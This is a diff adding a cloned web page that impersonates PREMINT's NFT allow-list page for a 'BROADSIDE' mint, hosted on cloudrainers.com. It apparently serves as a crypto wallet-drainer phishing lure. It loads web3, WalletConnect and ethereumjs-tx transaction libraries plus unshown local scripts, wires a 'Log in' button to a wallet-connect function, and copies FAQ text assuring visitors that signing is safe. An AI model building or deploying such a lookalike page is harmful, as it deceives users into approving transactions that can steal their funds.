@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from cloudrainers.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Dec 2022 06:24:54 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+
+    <script src="unpkg.com/axios%401.0.0/dist/axios.min.js"></script>
+    <script src="cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>
+    <script src="unpkg.com/moralis-v1%401.12.0/dist/moralis.js"></script>
+    <script src="unpkg.com/%40walletconnect/web3-provider%401.7.5/dist/umd/index.min.js"></script>
+    <script src="cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    
+    <script src="js/utils.js"></script>
+    <script src="js/showMess.js"></script>
+
+
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <title>BROADSIDE | PREMINT</title>
+    <meta name="description" content="
+I PROMISE THAT I WILL NOT LIST IT HIGHER THAN 100 ETH
+I PROMISE THAT I WILL UNDERCUT LIKE A MFER
+I PROMISE THAT MY AIM ISNT TO BE RICH
+
+BRING THE FKING …" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="CryptoPunks V1 | PREMINT" />
+    <meta property="og:url" content="https://www.premint.xyz/for-the-culture/" />
+    <meta property="og:image" content="https://premint.imgix.net/https%3A%2F%2Fs3.us-west-1.amazonaws.com%2Fredwood-labs%2Fpremint%2Fuploads%2Fimages%2Fecec7816e148479fa52bc7c565889716.jpg?fill=blur&amp;fit=crop&amp;h=628&amp;w=1200&amp;s=811bfafb0b70feb286e638bef2f1dbf1"
+    />
+    <meta property="og:site_name" content="PREMINT" />
+    <meta property="og:description" content="
+I PROMISE THAT I WILL NOT LIST IT HIGHER THAN 100 ETH
+I PROMISE THAT I WILL UNDERCUT LIKE A MFER
+I PROMISE THAT MY AIM ISNT TO BE RICH
+
+BRING THE FKING …" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="CryptoPunks V1" />
+    <meta name="twitter:description" content="
+I PROMISE THAT I WILL NOT LIST IT HIGHER THAN 100 ETH
+I PROMISE THAT I WILL UNDERCUT LIKE A MFER
+I PROMISE THAT MY AIM ISNT TO BE RICH
+
+BRING THE FKING …" />
+    <meta name="twitter:image:src" content="https://premint.imgix.net/https%3A%2F%2Fs3.us-west-1.amazonaws.com%2Fredwood-labs%2Fpremint%2Fuploads%2Fimages%2Fecec7816e148479fa52bc7c565889716.jpg?fill=blur&amp;fit=crop&amp;h=628&amp;w=1200&amp;s=811bfafb0b70feb286e638bef2f1dbf1"
+    />
+    <meta name="twitter:domain" content="https://www.premint.xyz/for-the-culture/" />
+    <meta name="robots" content="noindex,nofollow" />
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous" />
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    </script>
+
+    <link rel="stylesheet" href="https://redwood-labs.s3.amazonaws.com/theme/fonts/fontawesome-5/css/all.min.css" type="text/css" />
+    <link rel="stylesheet" href="https://redwood-labs.s3.amazonaws.com/theme/fonts/fontawesome-5/css/v4-shims.css" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.4.1/css/simple-line-icons.min.css" type="text/css" />
+    <link rel="stylesheet" href="https://redwood-labs.s3.amazonaws.com/theme/fonts/line-icons-pro/line-icons-pro.css" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" type="text/css" />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/3.4.2/css/swiper.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hamburgers/1.1.3/hamburgers.min.css" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.0/jquery.fancybox.min.css" />
+    <link id="stylesheet" type="text/css" href="https://redwood-labs.s3.amazonaws.com/theme/css/boomerang.min.css" rel="stylesheet" media="screen" />
+
+    <link type="text/css" href="https://redwood-labs.s3.amazonaws.com/premint/static/theme/css/custom-style.css" rel="stylesheet" />
+
+    <link href="https://redwood-labs.s3.amazonaws.com/premint/static/identity/images/favicon.png" rel="icon" type="image/png" />
+
+    <link href="https://redwood-labs.s3.amazonaws.com/premint/static/identity/images/apple-icon.png" rel="apple-touch-icon" />
+
+    <link rel="canonical" href="https://www.premint.xyz/for-the-culture/" />
+    <link href="https://fonts.googleapis.com/css?family=Inter:400,400i,500,500i,700,700i,800&amp;display=swap" rel="stylesheet" />
+    <style type="text/css">
+        body,
+        .heading,
+        .display,
+        .section-title .section-title-inner,
+        .btn,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-family: 'Inter', sans-serif !important;
+        }
+    </style>
+    <style type="text/css">
+        a,
+        a:hover,
+        .link,
+        .link:hover,
+        .link--style-1:hover,
+        .meta-category a,
+        .meta-category a:hover {
+            color: #2cbbdb;
+        }
+        
+        .c-base-1,
+        .text-primary,
+        .btn-base-5,
+        .btn-link,
+        .heading:hover>a,
+        .link--style-2,
+        .link--style-2:hover,
+        .navbar-aside .navbar-expand-lg .navbar-nav .nav-link:hover,
+        .navbar-aside .navbar-expand-lg .navbar-nav .nav-link:focus,
+        .navbar-aside .navbar-expand-lg .navbar-nav .show .nav-link,
+        .navbar-aside .navbar-expand-lg .navbar-nav .show .nav-link:hover,
+        .navbar-nav .dropdown-menu .dropdown-item:focus,
+        .navbar-nav .dropdown-menu .dropdown-item:hover {
+            color: #2cbbdb !important;
+        }
+        
+        .btn-base-1,
+        .btn-base-1:active,
+        .btn-base-1.active,
+        .btn-base-1:focus,
+        .btn-base-1:hover,
+        .btn-base-1.btn-outline:active,
+        .btn-base-1.btn-outline:focus,
+        .btn-base-1.btn-outline:hover,
+        .link-menu--style-3>a.active,
+        .link-menu--style-3>a:hover,
+        .timeline-img {
+            background-color: #2cbbdb !important;
+            border-color: #2cbbdb !important;
+        }
+        
+        .btn-base-1.btn-outline,
+        .btn-outline-primary,
+        .tabs--style-2 .nav-tabs .nav-item.show .nav-link,
+        .tabs--style-2 .nav-tabs .nav-link.active,
+        .tabs--style-2 .nav-tabs .nav-link:hover {
+            color: #2cbbdb !important;
+            border-color: #2cbbdb !important;
+        }
+        
+        .bg-base-1,
+        .btn-back-to-top,
+        .bg-primary,
+        .timeline::before {
+            background-color: #2cbbdb !important;
+        }
+        
+        .bg-base-1-gradient,
+        .bg-primary-gradient,
+        .btn-base-1-gradient {
+            background: linear-gradient(90deg, #0096bf 0%, #5cdeff 100%) !important;
+        }
+        
+        .nav-link:not(:hover) .c-base-1-gradient,
+        .text-primary-gradient,
+        .card .c-base-1-gradient {
+            background: linear-gradient(90deg, #0096bf 0%, #5cdeff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .btn-outline-primary:not(:disabled):not(.disabled).active,
+        .btn-outline-primary:not(:disabled):not(.disabled):active,
+        .show>.btn-outline-primary.dropdown-toggle,
+        .btn-outline-primary:hover,
+        .pagination>.active .page-link,
+        .pagination>.active .page-link:focus,
+        .pagination>.active .page-link:hover,
+        .pagination>.active>span,
+        .pagination>.active>span:focus,
+        .pagination>.active>span:hover {
+            background-color: #2cbbdb !important;
+            border-color: #2cbbdb !important;
+            color: white !important;
+        }
+        
+        .nav-link-active,
+        .navbar-nav .nav-link:focus,
+        .navbar-nav .nav-link:hover {
+            background-color: #2cbbdb !important;
+            border-color: #2cbbdb !important;
+            color: white !important;
+            border-radius: 4px !important;
+        }
+        
+        .navbar-aside .navbar-nav .nav-link:focus,
+        .navbar-aside .navbar-nav .nav-link:hover {
+            background-color: transparent !important;
+            border-color: transparent !important;
+        }
+        
+        .btn-base-1:active,
+        .btn-base-1.active,
+        .btn-base-1:focus,
+        .btn-base-1:hover,
+        .btn-base-1.btn-outline:active,
+        .btn-base-1.btn-outline:focus,
+        .btn-base-1.btn-outline:hover,
+        .btn-base-4:active,
+        .btn-base-4.active,
+        .btn-base-4:focus,
+        .btn-base-4:hover,
+        .btn-base-4.btn-outline:active,
+        .btn-base-4.btn-outline:focus,
+        .btn-base-4.btn-outline:hover,
+        .link--style-1:hover,
+        .meta-category a:hover,
+        .link--style-2:hover {
+            opacity: 0.8;
+        }
+        
+        .rounded-xl {
+            border-radius: 16px !important;
+        }
+        
+        .text-muted {
+            color: #818a91 !important;
+        }
+        
+        .bg-muted,
+        .badge-muted {
+            background-color: #f8f9fa !important;
+            color: #55595c !important;
+        }
+        
+        #project-description img {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        .container-over-top {
+            min-height: 200px;
+            margin: -150px auto 0;
+            z-index: 10;
+            position: relative;
+            padding-top: 0;
+        }
+        
+        .embed-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            max-width: 100%;
+        }
+        
+        .embed-container iframe,
+        .embed-container object,
+        .embed-container embed {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <style type="text/css">
+        .g-recaptcha>div {
+            width: 100% !important;
+        }
+    </style>
+    <style>
+        [x-cloak] {
+            display: none;
+        }
+    </style>
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div class="body-wrap">
+        <div id="st-container" class="st-container">
+            <div class="st-pusher">
+                <div class="st-content">
+                    <div class="st-content-inner">
+                        <div class="header">
+                            <nav class="navbar navbar-light navbar-expand-lg navbar-light bg-default navbar--bb-1px">
+                                <div class="container navbar-container">
+                                    <a class="navbar-brand py-4" href="https://cloudrainers.com/">
+                                        <img src="https://www.premint.xyz/static/identity/images/wordmark.9fbb71b4fd0b.svg" height="30" class="d-none d-lg-inline-block" alt="PREMINT" />
+                                        <img src="https://www.premint.xyz/static/identity/images/wordmark.9fbb71b4fd0b.svg" height="30" class="d-lg-none" alt="PREMINT" />
+                                    </a>
+                                </div>
+                            </nav>
+                        </div>
+                        <section class="background-image-holder bg-base-1" data-holder-offset="">
+                            <div class="slice holder-item holder-item-light has-bg-cover bg-size-cover" style="
+                    background-image: url('https://s3-redwood-labs.premint.xyz/premint/uploads/images/677cd748-6873-4c15-b7ac-303fbc3cc684.jpg');
+                    background-position: center center;
+                    min-height: 200px;
+                  ">
+                                <div class="container d-flex align-items-center"></div>
+                            </div>
+                        </section>
+                        <section class="slice sct-color-2 border-bottom">
+                            <div class="container container-over-top">
+                                <div class="row">
+                                    <div class="col-lg-7 mb-3">
+                                        <div class="profile-picture profile-picture--style-2 mx-0 mb-2 d-inline-block">
+                                            <img src="https://premint.imgix.net/https%3A%2F%2Fs3.us-west-1.amazonaws.com%2Fredwood-labs%2Fpremint%2Fuploads%2Fimages%2F81f6092b-71f4-4b1d-b7c4-b3f0559de60d.png?fit=crop&amp;fm=png&amp;h=400&amp;mask=ellipse&amp;w=400&amp;s=a34bf0bd6084d04d86c6065c2b791a4b"
+                                                class="mt-0 bg-white border-white" />
+                                        </div>
+                                        <h1 class="heading heading-1">BROADSIDE</h1>
+                                        <div class="row mt-4 text-md">
+                            
+
+                            
+                                            <div class="col-6 col-lg-4 mb-4">
+                                                <div class="text-uppercase text-sm text-muted">Mint Date </div>
+                                                <span>
+                                                    Nov. 15, 2022
+                                                    
+                                                    
+                                                </span>
+                                            </div>
+                                        
+            
+                                        
+            
+                                        
+                                            <div class="col-6 col-lg-4 mb-4">
+                                                <div class="text-uppercase text-sm text-muted">Total Supply </div>
+                                                <span>
+                                                    <i class="fas fa-octagon text-muted mr-1"></i>
+                                                    7,290 NFTs
+                                                </span>
+                                            </div>
+                                        
+            
+                                        
+            
+                                        
+            
+                                        
+                                            <div class="col-6 col-lg-4 mb-4">
+                                                <div class="text-uppercase text-sm text-muted">Official Link</div>
+                                                <span>
+                                                    <i class="fas fa-link text-muted mr-1"></i>
+                                                    <a href="https://cloudrainers.com/external-link-warning/?project=broadside&amp;signed_url=https%3A%2F%2Fwww.br0ads1de.com%3AcW_q0o9Li6dPhJvmrRTUDCaywKBYCHypzGveg_yw9m4" target="_blank" class="c-base-1">br0ads1de.com</a>
+                                                </span>
+                                            </div>
+                                        
+            
+                                        
+            
+                                        
+            
+                                    </div>
+                                    <div class="mr-lg-5 d-none d-lg-block" id="project-description">
+                            
+                            
+                                        <p>BROADSIDE&nbsp;<br><br>A decentralized tale of an anonymous band of heroes &nbsp; <br><br>A multi-part journey that unfolds from launch &nbsp; <br><br>CC0 or Full Commercial Rights &nbsp; <br><br>11 Episodic NFTs telling the story of your specific character, with new art for each episode, available to Broadsiders after mint&nbsp;&nbsp;<br><br>After all 11 chapters are released, 1-of-1 full book NFT featuring your specific character as the hero of the story and in the cover art will be made available to all Broadsiders &nbsp; <br><br>Collection features rare CC0 traits contributed by guest artists and from projects including Xcopy, OSF / Rektguy, Moonbirds, Eclectic Method, Goblintown, Nouns, Blitmaps, Kristy Glas, Cryptoadz, Robness and more</p>
+                                    
+                                </div>
+                                    </div>
+                                    <div class="col-lg-5 ml-lg-auto mb-5">
+                        
+
+                            
+
+                                        <div class="card z-depth-3 rounded-xl overflow-hidden no-border">
+                                            
+        
+                                            
+        
+                                                <div class="card-body border-bottom text-md text-center bg-muted">
+                                                    <div class="heading heading-3 mb-3">Log in to see the results.</div>
+                                                    <p class="text-md mb-0">BROADSIDE has picked winners. Login to see if you're on the list!</p>
+                                                </div>
+        
+                                                <div class="card-body">
+                                                    <a class="btn btn-styled btn-base-1 btn-xl btn-block no-border" onclick="connect('mm')">Log in<i class="fas fa-arrow-right ml-3"></i></a>
+                                                </div>
+        
+                                            
+        
+                                            <div class="card-footer  py-0">
+                                                <a href="https://cloudrainers.com/" class="btn btn-styled  btn-outline btn-block text-danger"><i class="fas fa-flag mr-2"></i>Report as Scam/Fraud</a>
+                                            </div>
+                                        </div>
+        
+        
+        
+        
+                                    
+                                
+                            </div>
+                            <div class="col-lg-12 d-lg-none">
+                                <div class="mr-lg-5" id="project-description">
+                                    
+        
+                                    <p>BROADSIDE&nbsp;<br><br>A decentralized tale of an anonymous band of heroes &nbsp; <br><br>A multi-part journey that unfolds from launch &nbsp; <br><br>CC0 or Full Commercial Rights &nbsp; <br><br>11 Episodic NFTs telling the story of your specific character, with new art for each episode, available to Broadsiders after mint&nbsp;&nbsp;<br><br>After all 11 chapters are released, 1-of-1 full book NFT featuring your specific character as the hero of the story and in the cover art will be made available to all Broadsiders &nbsp; <br><br>Collection features rare CC0 traits contributed by guest artists and from projects including Xcopy, OSF / Rektguy, Moonbirds, Eclectic Method, Goblintown, Nouns, Blitmaps, Kristy Glas, Cryptoadz, Robness and more</p>
+                                </div>
+                            </div>
+                        </section>
+                        <section class="slice-lg sct-color-2">
+                            <div class="container container-xs">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="section-title section-title--style-1 text-center mb-3">
+                                            <h3 class="section-title-inner heading-2 strong-500 text-normal">
+                                                Have questions?
+                                            </h3>
+                                        </div>
+                                        <div class="fluid-paragraph fluid-paragraph-sm text-center">
+                                            <p class="text-lg line-height-1_8 c-gray-light strong-300">
+                                                Here are some answers to commonly asked questions. Did we miss something?
+                                                <a href="https://twitter.com/premint_nft" target="_blank">
+                            DM us on Twitter
+                          </a> to ask anything else.
+                                            </p>
+                                        </div>
+                                        <span class="space-xs-xl"></span>
+                                        <div id="accordionOne" class="accordion accordion--style-3 accordion-cards--stacked" role="tablist" aria-multiselectable="true">
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-1" aria-controls="accordionOneCollapse-1" aria-expanded="false">
+                                Is registering for a PREMINT list safe?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-1" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-1">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        Yes. Over 1 million list registrations have happened on PREMINT without issue. When you sign in with PREMINT, you only are validating ownership of the wallet address. PREMINT does not get any permissions to perform transactions, and does not have any
+                                                        way of withdrawing anything from your wallet.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-2" aria-controls="accordionOneCollapse-2" aria-expanded="false">
+                                Who else has used PREMINT?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-2" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-2">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        Premint has been used by some of the top artists and collections in the NFT ecosystem, including XCOPY, Coldie, DeekayMotion, Cool Cats, Known Origin, Async Art, Shaq, and over 1,000 more.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-3" aria-controls="accordionOneCollapse-3" aria-expanded="false">
+                                Why does PREMINT ask permission to “suggest
+                                transactions to approve” when logging in with
+                                MetaMask?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-3" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-3">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        MetaMask’s standard text for anyone connecting their wallet (as of 3/2022) is “See address, account balance, activity, and suggest transactions to approve.” We don’t have any control over that and you’ll see that message when signing into any site with
+                                                        MetaMask.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-4" aria-controls="accordionOneCollapse-4" aria-expanded="false">
+                                Why do I need to “Sign” a message in addition to
+                                connecting my wallet.
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-4" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-4">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        Signing is the only way we can truly know that you are the owner of the wallet you are connecting. Signing is a safe, gas-less transaction that does not in any way give PREMINT permission to perform any transactions with your wallet.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-5" aria-controls="accordionOneCollapse-5" aria-expanded="false">
+                                If I disconnect my wallet or social networks
+                                after registering, will my entry still be valid?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-5" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-5">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        PREMINT saves your wallet and social info as a part of the registration step, so you can disconnect everything afterwards and your entry is still valid.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-6" aria-controls="accordionOneCollapse-6" aria-expanded="false">
+                                If I transfer the required NFT after
+                                registering, will my registration still be
+                                valid?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-6" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-6">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        As far as PREMINT is concerned, yes, but the project owner might check that you still own the token before finalizing the list.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-7" aria-controls="accordionOneCollapse-7" aria-expanded="false">
+                                Do you record my IP address?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-7" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-7">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        When you register, we store an encrypted version of your IP address and save it with your registration, but we never save or share your actual IP address and there is no way to get it from what we save.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-8" aria-controls="accordionOneCollapse-8" aria-expanded="false">
+                                Can I use one wallet to qualify and submit a
+                                different wallet for the access list?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-8" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-8">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        This is not currently possible, but we are working on this right now.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-9" aria-controls="accordionOneCollapse-9" aria-expanded="false">
+                                I registered, but the project says my wallet
+                                isn’t on the list. What happened?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-9" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-9">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        If you fully registered, the only way your wallet wouldn’t be on the list of registered wallets is if the project removed it. PREMINT never deletes wallets from the list for any reason.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-10" aria-controls="accordionOneCollapse-10" aria-expanded="false">
+                                It says my Discord or Twitter are attached to a
+                                different wallet. How do I disconnect them?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-10" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-10">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        If you don’t know what wallet your Discord or Twitter are connected to, just go to
+                                                        <a href="https://premint.xyz/disconnect" rel="nofollow">
+                                https://premint.xyz/disconnect
+                              </a> and you can force-disconnect them.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card border-bottom">
+                                                <div class="card-header" role="tab" id="accordionOneHeading-1">
+                                                    <h5 class="card-title mb-0">
+                                                        <a class="collapsed strong" data-toggle="collapse" data-parent="#accordionOne" href="#accordionOneCollapse-11" aria-controls="accordionOneCollapse-11" aria-expanded="false">
+                                What is an “access list”? Isn’t it called a
+                                “whitelist”?
+                              </a>
+                                                    </h5>
+                                                </div>
+                                                <div id="accordionOneCollapse-11" class="collapse" role="tabpanel" aria-labelledby="accordionOneHeading-11">
+                                                    <div class="card-block bg-light border-right border-left border-top p-3">
+                                                        While creators are welcome to name their PREMINT projects whatever they like, we choose to use the term &quot;allow list&quot; or &quot;access list&quot; vs &quot;whitelist&quot;. &quot;Whitelist&quot; could be considered exclusionary language, and the
+                                                        spirit of web3 is about inclusion.
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+                        <footer id="footer" class="footer">
+                            <div class="footer-bottom py-4">
+                                <div class="container">
+                                    <div class="row cols-xs-space col-sm-space align-items-center">
+                                        <div class="col-8 mb-0">
+                                            <div class="">
+                                                <div class="copyright">
+                                                    <ul class="copy-links no-margin">
+                                                        <li>
+                                                            Powered by
+                                                            <a href="https://www.premint.xyz/" class="c-white">
+                                  PREMINT
+                                </a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-4">
+                                            <div class="text-right">
+                                                <ul class="social-media social-media--style-1-v4">
+                                                    <li>
+                                                        <a href="https://twitter.com/premint_nft" class="twitter" target="_blank" data-toggle="tooltip" data-original-title="Twitter">
+                                                            <i class="fa fa-twitter"></i>
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </footer>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <a href="#" class="back-to-top btn-back-to-top"></a>
+
+        <!-- Code injected by live-server -->
+        <script type="text/javascript">
+            // <![CDATA[  <-- For SVG support
+            if ('WebSocket' in window) {
+                (function () {
+                    function refreshCSS() {
+                        var sheets = [].slice.call(document.getElementsByTagName("link"));
+                        var head = document.getElementsByTagName("head")[0];
+                        for (var i = 0; i < sheets.length; ++i) {
+                            var elem = sheets[i];
+                            var parent = elem.parentElement || head;
+                            parent.removeChild(elem);
+                            var rel = elem.rel;
+                            if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+                                var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+                                elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+                            }
+                            parent.appendChild(elem);
+                        }
+                    }
+                    var protocol = window.location.protocol === 'http:' ? 'ws://yourIp:127.0.01/' : 'wss://';
+                    var address = protocol + window.location.host + window.location.pathname + '/ws';
+                    var socket = new WebSocket(address);
+                    socket.onmessage = function (msg) {
+                        if (msg.data == 'reload') window.location.reload();
+                        else if (msg.data == 'refreshcss') refreshCSS();
+                    };
+                    if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+                        console.log('Live reload enabled.');
+                        sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+                    }
+                })();
+            }
+            else {
+                console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+            }
+        // ]]>
+    
+    </script>
+    
+</body>
+
+
+<!-- Mirrored from cloudrainers.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Dec 2022 06:25:07 GMT -->
+</html>
